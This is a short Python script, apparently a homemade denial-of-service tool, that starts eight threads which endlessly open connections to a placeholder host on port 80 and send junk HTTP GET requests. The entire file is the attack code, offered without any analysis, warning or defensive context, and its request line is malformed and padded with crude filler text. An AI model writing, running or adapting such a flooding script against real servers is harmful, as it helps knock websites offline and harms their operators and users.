# Made by an asian cat

import socket
from threading import Thread

host = "0.0.0.0"
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "i love hentai" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "i love hentai" + "HTTP/1.1 \r\n"), (ip, port))
            print("sended")
        except socket.error:
            print("error")
        mysocket.close()

for i in range(8):
    t = Thread(target=dos)
    t.start()
